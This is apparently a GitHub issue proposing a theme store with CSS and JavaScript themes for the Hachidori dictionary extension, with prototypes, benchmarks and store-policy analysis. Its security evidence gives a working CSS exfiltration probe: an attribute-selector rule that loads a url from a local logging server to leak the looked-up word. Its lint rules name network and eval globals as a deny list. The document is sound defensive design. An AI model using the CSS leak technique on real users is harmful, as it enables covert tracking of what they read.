## Problem

Split out of #330 at bee-san's request; origin comment: https://github.com/bee-san/hachidori/issues/330#issuecomment-5800587085 ("a github repo for hachidori themes, each theme is in a folder on its own … a Theme Store option … custom js + css … make a nazeka / rikaikun theme to start with … should we have a yaml file … add CI … what would it look like in hachidori too?"). Revised after the follow-ups [1](https://github.com/bee-san/hachidori/issues/334#issuecomment-5810638099) / [2](https://github.com/bee-san/hachidori/issues/334#issuecomment-5811238798) / 3: themes may ship **JavaScript** as well as CSS + YAML; a Nazeka JS theme matching Nazeka's own renderer, its benchmark against the default popup, and the rule that every theme is benchmarked are under *Evidence* and *Proposed solution*.

You hover a word in a visual novel and the popup is Hachidori's card layout — 32 px headword, 16 px definitions, a top bar of buttons, counts, frequency and pitch graphs. Nazeka and Rikaikun readers read faster with a dense "headword · reading · gloss" popup and nothing else. Today the only way there is **Settings → Design → Custom CSS** after reading `reader.css` for the class names — and CSS cannot move the headword out of the top bar or turn furigana into an inline reading. Nobody can hand you a finished theme, you cannot see one before pasting it, and a palette fix needs a release and a Web Store review.

What exists today (verified on `main` `fc3eb73`, Hachidori 0.1.6):

- **Palettes are hard-coded in the reader stylesheet.** 42 blocks of 17 `--hoshidicts-palette-*` properties selected by `:host([data-hoshidicts-theme=X])` (`extension/render/reader.css:37-958`, 46 KB of 95 KB); semantic colours derived once (:997-1104); four palettes carry extra rules (:1147, :1166, :1193, :1212); Settings (`settings.html:11`, `settings.css:40-76`) and startup (`startup.html:9`) load the same file.
- **The catalogue and its validation are code.** `POPUP_THEME_GROUPS` lists `auto` + 42 ids (`reader-options.js:186-197`); `POPUP_THEME_IDS` (:198) is what `normaliseField` validates, so an unknown id silently becomes `default` (:641-643, :657); Settings builds the `<select>` from it (`settings.js:1788-1799`).
- **Applying a theme is one attribute plus four variables.** `createPopupAppearance` resolves `auto` via `matchMedia`, sets `host.dataset.hoshidictsTheme` (`extension/render/popup.js:62-118`, :81-86) and `--gsm-hoshidicts-popup-{opacity,width,height,scale}` (:101-106); `applyPageTheme` does the same on the Settings `<html>` (`extension/settings-dom.js:4-19`).
- **Custom CSS is one free-text option.** `customPopupCss` (`reader-options.js:114`, plain string :669) is adopted in the popup shadow root as a constructed stylesheet appended **last** (`popup.js:42-60`; `content.js:2086-2099` puts `reader.css` + `icons.css` first); the Design preview does the same (`design-preview.js:5-16`).
- **Custom JavaScript already exists.** `customPopupJavascript` (`reader-options.js:115`) is a `chrome.userScripts` script in the `USER_SCRIPT` world (`custom-javascript.js:9-26`; `background.js:2015`), needs the `userScripts` permission (`manifest.json:21`), is hidden on Firefox (`overlay-mode.js:24`) and has no post-render hook — it must observe the open shadow root (`content.js:2086`).
- **The renderer has no post-render extension point.** Term renders end in `bindResultActions` (`content.js:2221`), kanji renders in `executeKanjiRequest` (:3205-3225); nothing outside `popup.js` can restructure the top bar (`createResultChrome` :2845).
- **Dictionary CSS already has a sanitiser.** `isSafeDictionaryStyle` rejects escapes, `url(`/`src(`/`image-set(`/`paint(`/`attr(`, custom functions and non-generic fonts (`glossary.js:1326-1342`); `filterDictionaryStyleRules` drops `@font-face`/`@import`/`@property`/`@keyframes` (:1370-1392); survivors go in `@scope` (:1394-1446). Nothing guards `customPopupCss` (`settings.html:829`).
- **No YAML parser, no build step** in `extension/` or `test/tooling/package.json` (`extension/README.md`); the hover benchmark (`benchmark/hover-popup.mjs`) has no theme option.

### Design settings today, and whether each could move to a theme

Every Design key is in `DESIGN_OPTION_KEYS` (`reader-options.js:199-204`, 24 keys).

| Setting (Settings → Design) | Storage | Code path | Movable to a theme? |
| --- | --- | --- | --- |
| Theme (palette) | `options.popupTheme` (:112) | `data-hoshidicts-theme` → `reader.css` palette blocks; Settings derives UI colours | **Yes** — this *is* the theme; ships as `palette:` in `theme.yaml`, compiled to the same CSS block. |
| Custom CSS | `customPopupCss` (:114) | constructed sheet adopted last (`popup.js:42-60`) | **Yes** — a theme is "custom CSS with metadata"; the user's own Custom CSS stays a personal layer *above* the theme. |
| Custom JavaScript | `customPopupJavascript` (:115) | `chrome.userScripts` (`custom-javascript.js`) | **Yes, as `theme.js` bundled with a release**: a module with an `onRender` hook. The user's Custom JS box stays. |
| Background opacity | `popupOpacityPercent` (:126, 0–100) | `--gsm-hoshidicts-popup-opacity` (`popup.js:105`), `color-mix` at `reader.css:998-1030` | **Partly** — a theme may *suggest* a value (Nazeka is opaque); the user keeps the control. |
| Width / Height; Scale | :123-125 | `--gsm-hoshidicts-popup-width/height`; `zoom:` (`reader.css:1107`) | **Partly** (suggest) / **No** (device preference). |
| Toolbar position; Show the audio button | :113, :128 | `resolveToolbarPosition` (`popup.js:4266`); `data-hoshidicts-audio-button` (:99) | **Partly** (suggest); a JS theme may remove the bar or hide the button, semantics stay the user's. |
| Highlight the word on the page | `sourceHighlightEnabled` (:127) | `::highlight` sheet in the *page* document (`popup.js:69-79`) | **No** (behaviour); its colour already follows the palette (:73). |
| Definition columns ("2 panel") | `popupColumns` (:129, 1–4) | `--gsm-hoshidicts-popup-columns` grid (`reader.css:2367`) **and** JS masonry (`popup.js:2321-2354`) | **Partly** (suggest): the masonry column count comes from the option. |
| Image source, Clicked-kanji, Preferred pitch, Summary dictionary; Custom buttons / links | :144, :151, :148, :143; `customButtons`, `customLinks` | selectors pruned against the library (`background.js:1509`); action row (`popup.js:2581-2642`) | **No** — the user's dictionaries and tools. |
| Frequency names / averages, pitch furigana / badge, grammar tags; compact summary, snippet count | :141-150 | `METADATA_OPTION_KEYS` (`popup.js:26-27`); `reader.css:1741` | **Partly** (suggest) — they change what is rendered; a theme may hide the result. |
| Font, sizes, radius, shadow, blur, spacing, animation; layout structure (headword placement, inline reading, flat list, no top bar) | *(no setting)* | `reader.css:1105-1125`; `popup.js` DOM construction | **Yes** via theme CSS; structure via theme JS (what CSS cannot do; see the prototype). |

Boundary: a **theme** is presentation — CSS over the popup DOM, a palette, JS that rearranges or hides what the renderer produced, and *one-shot suggestions* for the "partly" toggles; a **setting** is anything tied to the user's library, device, behaviour or Anki. A theme never owns a setting continuously, and theme JS never does lookups, network, storage or Anki.

## Expected behavior

1. A public repository `bee-san/hachidori-themes` (the name is free: `gh repo view` → "Could not resolve to a Repository") holds one folder per theme: `themes/<slug>/theme.yaml` plus optional `theme.css`, `theme.js`, `README.md`, `screenshot.png`. CI on every pull request validates the YAML against a JSON Schema, sanitises `theme.css`, lints `theme.js` and runs its hook against a fixture popup, checks the screenshot, renders the theme in the pinned Chrome for Testing, benchmarks it against the default popup, and fails if the committed `dist/` is stale.
2. Hachidori never parses YAML and never fetches code: it ships `dist/index.json` and the bundled themes (CSS **and** JS) under `extension/vendor/themes/`, committed build output vendored from a pinned `hachidori-themes` commit and reviewed with each release, and loads a theme by slug through the existing `data-hoshidicts-theme` attribute plus a small theme-JS host in the reader.
3. **Settings → Design** keeps the Theme `<select>` and gains a **Theme Store**: a card grid (swatches, name, author, tags, a **JS** badge, state *Bundled* / *Install* / *Installed* / *Update available* / *Arrives with the next release*), search and tag filter, and a detail pane with screenshot, description, benchmark line, a permission-style notice for JS themes ("Runs JavaScript inside the popup: <summary>. Ships inside Hachidori x.y.z, cannot use the network or read the page, switched off automatically if it fails"), "Use this theme", "Open on GitHub", "Report a problem", "Uninstall". The grid renders from the vendored index with zero network; Install fetches CSS-only themes and verifies the index's SHA-256; JS themes are never installed from the network.
4. Theme CSS is adopted in the popup shadow root **between** `reader.css` and the user's Custom CSS: reader.css < dictionary `@scope` styles < theme < Custom CSS. Rules that could fetch a resource are rejected at install *and* at adoption.
5. Theme JS is one ES module per theme with a synchronous `onRender(view, api)` hook the reader calls after each term/kanji render; a hook that throws is switched off for that page with one warning and the popup keeps working on the CSS layer (proven under *Evidence*).
6. Existing users keep their palette: a stored `popupTheme: "dracula"` selects the same 17 colours through the same selector, now from `vendor/themes/dracula.css`. A slug whose CSS is missing renders as `default`, Settings says "Theme *x* is not installed", the value is kept.
7. `nazeka` (CSS + JS) and `rikaikun` (CSS) exist from day one. Activating `nazeka` yields Nazeka's popup: `食べる《たべる》` in 18 px `#99ddff` / 15 px `#99ff99`, the looked-up sentence at the right, 13 px senses in one paragraph on `#111111`, only the Anki and audio buttons kept (*Evidence*).
9. Every theme with CSS or JS is **benchmarked** against the default popup with `benchmark/hover-popup.mjs` before it is accepted, by its author and by the themes-repo CI, within published budgets (*Proposed solution*).
8. No theme-related network request happens unless the user presses Refresh / Install / Update / opens a detail pane, or turns on the optional catalogue refresh (default off, like the dictionary schedule, `managed-dictionary-source.js:32`).

Yomitan's closest behaviour: `general.customPopupCss` plus per-dictionary `styles` scoped to `[data-dictionary="…"]` (`ext/js/display/display.js:1312-1321` at `d34832d`); no JS hooks, no catalogue, no benchmark.

## Environment

- Hachidori `0.1.6` (`extension/manifest.json` on `main` `fc3eb73`), built from source and loaded unpacked; the Web Store build is the same code.
- Browser: everything was reproduced in the pinned Chrome for Testing **152.0.7977.75** on Linux (`test/tooling/package.json` `config.chrome`), headless.
- Where: **Settings → Design** (`extension/settings.html:623-871`) and the lookup popup on every page (own shadow root); also the Firefox 153+ package (no `userScripts`: `manifest.firefox.json:13-19`) and GSM overlay mode.
- Dictionaries: `test/fixtures/hachidori-fixture.zip` (6 terms, 2 frequency, 2 pitch, 1 kanji) imported through Settings → Add dictionaries; fresh profiles, `customPopupCss: ""`; the benchmark used the hover fixture plus two purpose-built archives.
- Settings changed from defaults for the prototype (through `hd_options_write`): `lookupMode: "hover"`, `popupOpacityPercent: 100`, an Anki `Basic` note type, and `popupTheme: "nazeka"` for the themed shots; the benchmark used the harness's own settings plus `popupTheme`.

## Evidence

Everything is on branch `evidence/issue-330-theme-store` under `docs/evidence/issue-330/theme-store/` (first round in the folder root; the JS prototype under `nazeka-js/`; the themes-repo schema, validator and lint config under `hachidori-themes-skeleton/`).

### Nazeka (JS) prototype

`theme.yaml` + `theme.css` + `theme.js` (below) run by a worktree-only host in `content.js` ([`host-prototype.patch`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/host-prototype.patch), 230 lines; every file named here is under [`nazeka-js/`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js)): theme sheet at index 1, `import()` of the theme at content-script start, `onRender` after `bindResultActions` and `executeKanjiRequest`, `view.lookup`, per-call timings. Captured by `capture-nazeka-js.mjs` in Chrome for Testing 152.0.7977.75: fixture imported through Settings, a `Basic` note type against a fake AnkiConnect on `127.0.0.1:8765` (`test/anki-connect-fake.mjs`, the `chrome-e2e.mjs:4957-4995` handlers) so the Anki button exists, hover 食べたかった, click 食. Third column: **Nazeka itself** — `build_div`/`build_div_kanji` from wareya/nazeka `texthook.js` (`8b220fb`, default settings) extracted and rendered in the same Chrome by `nazeka-reference.mjs`; last row: Nazeka in Firefox, from its tutorial.

![Default vs Nazeka theme vs Nazeka itself: 食べたかった term view, 食 kanji view, and Nazeka's tutorial screenshot](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/nazeka-js-side-by-side.png)

**Fidelity** (every rule cites `texthook.js`; the `theme.css` header lists them): box `#111111`, 1 px `#CCCCCC` frame, 2 px padding, 2–3 px radii, no shadow, Arial 13 px, shrink-to-fit ≤ 600 px (:5-81, :219-221); right-floated looked-up row at 70 %, three characters of context, match bold in `#99DDFF` (:650-676, from the new `view.lookup`); `食べる《たべる》～-たい→-た #142 (食べる:たべる)` — 18 px `#99DDFF` keb, 15 px `#99FF99` reb, deconjugation chain, `#rank (keb:reb)` at 80 % (:592-641, :1052-1066); senses as one paragraph `(vt) (1) to eat; to live on (e.g. a salary); (col) (2) …` (:440-521); entries 3 px apart, no separators (:765); kanji mode `Currently in individual kanji mode. Press [Back] to cancel.`, `Grade: Kyouiku`, `Strokes: 9`, `Jouyou readings:`, `On'yomi: ショク、ジキ`, `Kun'yomi: く.う、た.べる` (:1188-1303). Measured (`evidence.json`): Nazeka term popup 463 × 135 (content-sized) vs default 560 × 420, `#111111`, headword `18px rgb(153, 221, 255)`, glosses `13px`, top bar `hidden`; kanji view 355 × 162. **Back on the headword row and nothing else:** the Anki and audio buttons, 24 px and borderless inside the looked-up row like Nazeka's own arrow/close icons (:676-716) — `+` and the speaker in the capture, `Mine to Anki` bound after the render lands in place; Note, custom and close buttons stay hidden; the kanji view keeps Back as the `[k]` stand-in. What the DOM cannot match: pos and misc tags are one list, so `(col)` precedes `(2)` where Nazeka prints `(2) (col)`; deinflection steps carry the engine's names (`-たい→-た`, Nazeka `want→past`); the kanji view adds a `Meanings:` line and has no composition data.

**Fault isolation** (`fault-isolation.mjs`, re-run on this host): a `theme.js` that hides the top bar and then throws leaves the popup rendered with the theme CSS, exactly one `console.warn`, later renders skip the hook — `popupRendered`, `cssStillApplied`, `exactlyOneWarning`, `hookSwitchedOff` all `true`. **Lint gate** (`hachidori-themes-skeleton/scripts/theme-js.eslint.config.mjs`, ESLint 9.39.1): this `theme.js` passes with 0 problems; the hostile module from round 2 still fails on 16 counts.

[`themes/nazeka/theme.yaml`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.yaml) (palette keys elided; the `benchmark:` block is the run below):

```yaml
# themes/nazeka/theme.yaml — Hachidori theme manifest, schema 1
schema: 1
slug: nazeka
name: Nazeka
version: 1.1.0
author: bee-san
link: https://github.com/wareya/nazeka
description: Nazeka's popup as texthook.js draws it — #111111 box with a 1 px #cccccc frame, 18 px cyan headword with 《reading》, the looked-up sentence at the right, 13 px senses as "(pos) (1) gloss; gloss", kanji mode as plain lines. Only the audio and Anki buttons stay.
tags: [dark, compact, classic, nazeka]
license: GPL-3.0-or-later
minHachidoriVersion: 0.1.7
mode: dark
extends: default
palette:                 # 17 keys from wareya/nazeka texthook.js:31-35 — unchanged since round 2, see the full file
  base-100: "#111111"    # bgcolor … primary: "#99ddff" (hlcolor) … secondary: "#99ff99" (hlcolor2) …
css: theme.css
js:                      # bundled-only: shipped inside the Hachidori release, never fetched at runtime
  file: theme.js
  hooks: [onRender]
  summary: Rebuilds each entry as Nazeka's rows (looked-up text, 「headword」《reading》～deconjugation #frequency, compact senses; kanji mode lines), moves the audio and Anki buttons inline and hides the rest of the top bar.
options:                 # one-shot suggestions applied on activation, with Undo
  popupOpacityPercent: 100
  popupColumns: 1
screenshot: screenshot.png
preview:
  swatches: ["#111111", "#cccccc", "#99ddff", "#99ff99"]
benchmark:               # benchmark/hover-popup.mjs, this theme vs default, same Chrome and archives (see "How to benchmark a theme")
  harness: hover-popup.mjs
  harnessCommit: fc3eb73053be4851e68217de22cacd8e36a14935   # Hachidori commit the harness and reader came from
  chrome: 152.0.7977.75
  sessions: 5
  measuredAt: 2026-09-24
  onRenderP95Ms: 0.3     # 280 hook calls; budget 2
  onRenderMaxMs: 0.6
  hoverCompleteMedianMs: { default: 33.2, theme: 33.3 }   # 食べる, warm
  longEntryCompleteMedianMs: { default: 33.3, theme: 33.3 }   # 漢字 with 24 senses
  deepEntryCompleteMedianMs: { default: 33.3, theme: 33.3 }   # 深層, 40 nested elements
  kanjiOpenMedianMs: { default: 3.4, theme: 4.1 }          # click → kanji view in the DOM
  coldFirstMedianMs: { default: 38.5, theme: 41.1 }        # first hover of a fresh profile
  heapDeltaMiB: 0.33
  results: https://github.com/bee-san/hachidori/blob/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/run2/summary.md
```

[`themes/nazeka/theme.js`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.js) (170 lines, full file on the branch): `renderTerm` builds the looked-up row from `view.lookup`, `api.move`s the top bar's action group into it, then per entry `wordRow` moves the `.gsm-hoshidicts-expression` into a `span.nazeka-word`, appends `《reb》` (from the headword's `aria-label`, `popup.js:3199-3204`), `～step→step` from the deinflection steps and `#rank (keb:reb)` from `.gsm-hoshidicts-frequency-value`, and `api.hide`s metadata, tags, deinflection, compact summary and the secondary header; `renderKanji` writes Nazeka's lines from `.gsm-hoshidicts-kanji-stats dl` and the reading groups. Only `view`/`api` are touched; ESLint 0 problems.


[`themes/nazeka/theme.css`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.css) (330 lines, full file on the branch) opens with a map of every value to its `texthook.js` line, then the palette block generated from `theme.yaml`, the box, the looked-up row, the headword row, the inline senses (`li` as `display: inline` with `(n)` counters and the tags as `(…)` text) and the kanji lines.

### Benchmark: Nazeka theme vs default

`benchmark/hover-popup.mjs` drives real pointer movement through the content script and records input → first correct frame, input → complete stable result, blank time, `Performance.getMetrics` deltas and long tasks per scan, over fresh Chrome profiles. Everything below is under [`nazeka-js/benchmark/`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark) on the evidence branch. Two worktree-only additions (`harness-benchmark.patch`, 77 lines): `HACHIDORI_HOVER_OPTIONS` (JSON merged into the options the harness writes — `{"popupTheme":"nazeka"}` selects the theme exactly as Settings would) and, per scan, the host's `onRender` timings plus eight **kanji-view** opens (programmatic click on the 漢 link in the 漢字 popup → kanji entries in the DOM → next frame). Inputs, identical on both sides: the harness's fixture (食べる **short** flat entry; 深層 **deep**, gloss under 40 nested elements) plus `theme-bench-fixture.mjs` (漢字 with **24 numbered senses**, 233 popup nodes; a kanji bank for 漢/字). Same Chrome for Testing 152.0.7977.75 (`npm --prefix test/tooling run install:chrome`), same three archives, **5 fresh profiles per side**, back to back on one machine (load in each `manifest.json`); `run-benchmark.sh` ran it and logged every command with its output to `run2/commands.txt`; raw results `run2/{default,nazeka}/raw.json` (+ `manifest.json`, cold screenshots), `run2/summary.{json,md,yaml}` from `summarise.mjs`.

```text
$ node benchmark/hover-popup.mjs /tmp/theme-bench/run2/default hover-popup-fixture.zip theme-bench-senses.zip theme-bench-kanji.zip   → real 0m34.017s
$ HACHIDORI_HOVER_OPTIONS='{"popupTheme":"nazeka"}' node benchmark/hover-popup.mjs /tmp/theme-bench/run2/nazeka <same archives>   → real 0m32.993s
```
(`HACHIDORI_HOVER_SAMPLES=5`; Chrome and puppeteer-core from `test/tooling`; the fixture builds and the `summarise.mjs` call are in `commands.txt`.)

| Input | Measure (ms, median / p95) | Default | Nazeka (JS) | Δ median |
|---|---|---|---|---|
| short 食べる | hover → first correct frame | 16.8 / 17.0 | 16.8 / 16.9 | 0 |
|  | hover → complete result | 33.2 / 38.6 | 33.3 / 33.4 | +0.1 |
|  | layout · style recalc · script per scan; DOM nodes | 0.63 · 0.70 · 1.19; 32 | 0.37 · 0.56 · 1.07; 37 | −0.26 · −0.14 · −0.12; +5 |
| long 漢字 (24 senses) | hover → first correct frame | 17.1 / 56.3 | 17.0 / 51.4 | −0.1 |
|  | hover → complete result | 33.3 / 81.9 | 33.3 / 80.0 | 0 |
|  | layout · style recalc · script per scan; DOM nodes | 1.73 · 1.38 · 1.35; 228 | 1.55 · 1.62 · 1.22; 233 | −0.18 · +0.24 · −0.13; +5 |
| deep 深層 | hover → first correct frame | 16.9 / 85.6 | 16.8 / 85.3 | −0.1 |
|  | hover → complete result | 33.3 / 112.2 | 33.3 / 116.4 | 0 |
| kanji 漢 | click → kanji view in the DOM | 3.4 / 8.7 | 4.1 / 10.1 | +0.7 |
|  | click → next frame | 8.8 / 17.1 | 10.0 / 17.0 | +1.2 |
| cold (fresh profile) | first hover → first frame | 38.5 / 85.1 | 41.1 / 47.5 | +2.6 |
|  | first hover → complete | 54.1 / 89.9 | 49.9 / 50.9 | −4.2 |

`theme.js` **`onRender`** over all 280 calls: median 0.1 ms, **p95 0.3 ms**, max 0.6 ms (term 0.2 ms p95 for short, 24-sense and deep entries; kanji 0.5 ms). Reading-tab JS heap at session end: 4.27 MiB default vs 4.60 MiB Nazeka (**+0.33 MiB**). Against the harness's own rule (*"first/complete regression > 5 ms and 10% requires investigation"*): no input regresses; warm hover timings are frame-quantised (16.7 ms at 60 Hz) and identical on both sides, and the theme's per-scan layout/style work is at or below the default's (fewer laid-out nodes once tag rows, cards and metadata are hidden).

**What the first run found and fixed.** `run1-before-preload/` had the host start the theme fetch + `import()` at the first popup build: cold first frame 58.2 vs 38.5 ms (**+19.7**), cold complete 88.9 vs 54.6 ms (**+34.3**, p95 168 ms) — a cost every page paid once, while warm scans were unchanged. Loading the theme at content-script start (`adoptOptions` → `syncTheme()`, the CSS applied the moment the shadow root exists) brought the cold hover back to parity (run 2 above). Both runs' raw JSON are on the branch.

### Earlier evidence (CSS drafts and the Custom-CSS leak)

Round 1 ([folder root](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/)): Settings → Design today (`01-…png`), design-preview renders of the default palette and the CSS-only `nazeka`/`rikaikun` drafts (`02`–`04`, measurements in `evidence.json`); `rikaikun.theme.css` reproduces Rikaikun's `blue` theme (`melink14/rikaikun` `extension/css/popup.css:2-13`, :86-110 at `dd50b08`). **What unsanitised CSS in the popup's shadow root can do** (a constructed sheet appended like `popup.js:42-60`, a local server logging requests; `evidence.json` → `exfiltration`): `.gsm-hoshidicts-entry[data-expression^="食"] { background-image: url(http://127.0.0.1:…/leak) }` — **request received**, the `犬` probe did not fire, so a few hundred rules learn the looked-up word (`data-expression` is on every entry, `popup.js:3365`); `@import` in a constructed sheet — ignored; `@import` in a `<style>` element in the shadow root — **fetched and applied**; `@font-face` in the adopted sheet — no request (and `isSafeDictionaryStyle` rejects it). Existing suites on this checkout: `node --test` on the theme/options/template tests → 28 pass; `node test/make-fixture.mjs && node test/extension-smoke.mjs` → **631 passed, 0 failed**.

## Benefit to the creator

Before: someone posts their Nazeka-style popup on Discord; to get it you open Custom CSS, read `reader.css` for class names, paste 100 lines, and still cannot move the headword out of the top bar or lose the buttons and pitch graphs, because CSS cannot restructure the DOM. Fixing one colour in `autumn` (`test/autumn-theme.test.mjs` exists because that happened) means a release and a Web Store review.

After: Settings → Design → Theme Store, "nazeka", Use — the next hover shows Nazeka's popup (middle column above), a third of the height, with a measured cost of 0.3 ms per render. Palette-only themes update from `hachidori-themes` without touching the extension; JS themes ride the next release, reviewed with it. A theme that breaks switches itself off and leaves the CSS look. Your own Custom CSS still sits on top.

## Proposed solution and alternatives

### Direct answers to the origin comment and follow-ups

| Question | Answer | Why |
| --- | --- | --- |
| "a github repo for hachidori themes, each theme is in a folder on its own" | **Yes: `bee-san/hachidori-themes`, `themes/<slug>/`** with `theme.yaml` (+ optional `theme.css`, `theme.js`, `README.md`, `screenshot.png`). | Obsidian's model (manifest + CSS + screenshot + one central index); the shape Hachidori already trusts (`recommended-dictionaries.js:53`). |
| "Theme Store option in Design … loads the names of the themes" | **Yes**: a card grid in Settings → Design fed by a vendored `index.json`; screenshots and CSS-only installs are fetched on demand. | Offline-safe. |
| "custom js + css" / "use js to make nazeka theme remove topbar" / "we should use js more for themes" | **Yes to both.** `theme.css` + `theme.js`, a module with an `onRender(view, api)` hook called after every render. JS themes are **bundled into Hachidori releases**, never fetched; CSS-only themes also install live. The Nazeka theme rebuilds the popup with 170 lines of `theme.js`. | Web Store policy forbids fetched code, not bundled code. |
| "make a nazeka / rikaikun theme to start with" | **Both**: `nazeka` (CSS + JS, matching Nazeka's renderer, benchmarked) and `rikaikun` (CSS, drafted). | Two documented looks. |
| "Our colour themes can all move to the theme repo too" | **Yes**: the 42 palettes become `theme.yaml` files; the compiled CSS is vendored back into `extension/vendor/themes/`. | `reader.css` loses 46 KB; `POPUP_THEME_GROUPS` (`reader-options.js:186-197`) is generated. |
| "maybe same with other design settings like 2 panel etc?" | **Partly**: as *one-shot suggestions* (`options:` in `theme.yaml`, applied on activation with Undo), never as owned settings. | Columns drive JS masonry (`popup.js:2321-2354`); a theme pinning them would fight the Design controls. |
| "what else from design can we move" | Fonts, sizes, radii, shadows, blur, spacing, animation, tag/badge/tab styling, card vs. flat layout, and with JS the DOM structure; nothing tied to dictionaries, device, Anki or behaviour. | Table under *Problem*. |
| "yaml file … or just a readme?" | **YAML for machines, README for humans.** `theme.yaml` is the contract (metadata, palette, css, js, options, screenshot, benchmark). | A README cannot be validated or turned into store cards. |
| "how do we parse and handle this on our side?" / "we just vendor the yamls" | **No YAML in the extension.** CI compiles every `theme.yaml` into `dist/index.json` + `dist/themes/<slug>.css`; Hachidori vendors the compiled index and the bundled themes and uses `JSON.parse`. CSS-only themes download on demand with SHA-256 verification. | No new dependency in a no-bundler codebase. |
| "add CI … yaml … screenshot" / "what would it look like in hachidori too?" | **Yes**: workflow, validator, lint gate and benchmark gate below; wireframe under *Hachidori side*. | |

### Security and policy: which JS paths are allowed, and the one chosen

**The rules.** "Additional Requirements for Manifest V3" (developer.chrome.com/docs/webstore/program-policies/mv3-requirements, 2024-04-03): "external resources must not contain any logic … Using JavaScript's `eval()` method or other mechanisms to execute a string fetched from a remote source; Building an interpreter to run complex commands fetched from a remote source, even if those commands are fetched as data" are listed violations; "Fetching a remote configuration file … where all logic … is contained within the extension package" is allowed. The companion page (developer.chrome.com/docs/extensions/develop/migrate/remote-hosted-code): "Remotely hosted code, or RHC, is … anything that is executed by the browser that is loaded from someplace other than the extension's own files … It *does not* include data or things like JSON or CSS"; user scripts are for "code provided by the user". `extension_pages` CSP "cannot be relaxed beyond" `script-src 'self' 'wasm-unsafe-eval'` (`manifest.json:118`).

**JS delivery paths, honestly:**

| Path | Policy | Verdict |
| --- | --- | --- |
| **(A) `theme.js` vendored into the extension at release time** (`extension/vendor/themes/<slug>/theme.js`, pinned commit, `import(chrome.runtime.getURL(…))` from the content script) | The extension's own file, reviewed with the release: not RHC. | **Chosen.** The prototype runs this way. |
| (B) The user pastes `theme.js` into **Custom JavaScript** (`chrome.userScripts`) | "Code provided by the user" — allowed if the user does it, not as an Install button. | Escape hatch: runs in the `USER_SCRIPT` world without the theme `api`. |
| (C) Fetch `theme.js` and `import()`/`eval` it | RHC; listed violation. | **Never** — why the store cannot "Install" a JS theme at runtime. |
| (D) Fetch a JSON "script" and interpret it | "an interpreter to run complex commands fetched … as data" — listed violation. | **Never.** `options:` stays a flat validated map. |
| (E) Sandboxed page with `'unsafe-eval'` | Exempt from RHC but without DOM access to the popup; would need a mutation protocol = (D). | Not worth building. |

Consequences of (A): every new or changed JS theme ships with a Hachidori release (a one-line vendor bump covered by Hachidori CI and review); the store shows them as *Bundled* or *Arrives with the next release*; CSS-only themes keep the live Install path. Theme JS runs with `content.js`'s privileges, so the trust boundary is **CI lint + hook contract + benchmark gate + maintainer review at vendoring**, not a sandbox — said plainly in the store notice and `AGENTS.md`.

### Theme JS API (schema 1)

A theme module is `themes/<slug>/theme.js`: one ES module, one default export, no imports.

```js
export default {
  schema: 1,                 // host refuses any other value
  slug: "nazeka",            // must equal theme.yaml slug
  onActivate?(api),          // once per popup level when the theme becomes active (before its first render)
  onRender(view, api),       // after every term/kanji render and re-render (tab switch, Show more, Back)
  onDeactivate?(api),        // theme switched off or popup level destroyed
};
```

`view` (frozen): `kind` `"term" | "kanji" | "notice" | "failure"`, `depth`, `popup` (`.gsm-hoshidicts-popup`), `chrome` (the top bar `.gsm-hoshidicts-result-chrome` or `null`), `content` (`.gsm-hoshidicts-content-scroll`), `entries` (the `.gsm-hoshidicts-entry` / `.gsm-hoshidicts-kanji-entry` articles), `lookup` `{ text, sentence, offset }` — the matched page text and Yomitan's sentence around it (`content.js:706-708`), read-only, for Nazeka's looked-up row. `api` (frozen): `theme` `{ slug, version }`; `options` — frozen copy of the `DESIGN_OPTION_KEYS` values; `el(tag, className?, text?)` — the only way to make DOM (no HTML strings); `hide(node)` — sets `hidden` + `data-theme-hidden=<slug>`, which theme CSS collapses; `move(node, parent, before?)` — reparent only between the popup subtree and detached `api.el` elements (throws otherwise, so nothing reaches the page); `setVariable(name, value)` — `--theme-*` properties on the popup only; `requestLayout()` — re-place the popup next frame; `log(...)`. Nothing else: no shadow root, document, options write or messaging.

Lifecycle and isolation (host in `content.js`, prototyped in `host-prototype.patch`): the module and its CSS load once per page **at content-script start** when the options name a JS theme (loading at the first popup cost the cold hover +20 ms first frame / +34 ms complete — *Benchmark*), the CSS becoming the second adopted sheet as soon as the shadow root exists; `onRender` runs synchronously **after** the reader's own post-render work (`bindResultActions`, `executeKanjiRequest`) and is never awaited, so a slow or throwing hook cannot delay or break a lookup that already rendered; the first throw sets `disabled` for the page with one `console.warn`, later renders skip the hook and keep the CSS layer (*Evidence*); a hook over 8 ms logs its duration and every call's duration is exposed to `benchmark/hover-popup.mjs`; switching theme stops calling hooks (`onDeactivate` undoes listeners); hooks re-run on open popups when a theme is activated. `schema` is the compatibility contract: a `schema: 2` module is refused by a `schema: 1` host with a store note, not run.

CI for `theme.js` ([validate.mjs](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/hachidori-themes-skeleton/scripts/validate.mjs)): ≤ 64 KiB; ESLint with an empty globals map plus `no-restricted-globals` (`window`, `document`, `globalThis`, `chrome`, `browser`, `fetch`, `XMLHttpRequest`, `WebSocket`, storage, timers, observers, `eval`, `Function`, …) and `no-restricted-syntax` (any `import`/`import()`, non-default exports, `async`/`await`, `innerHTML`/`insertAdjacentHTML`/`srcdoc`, `on*` attributes, tagged templates); the default export must have `schema: 1`, `slug` = folder and exactly the declared hooks; a jsdom smoke test runs `onRender` on the fixture popup with the real `api` (no throw, nothing attached outside the popup); the real-Chrome render screenshots the result; the benchmark gate measures it. The prototype passes; a hostile module fails on 16 counts (*Evidence*).

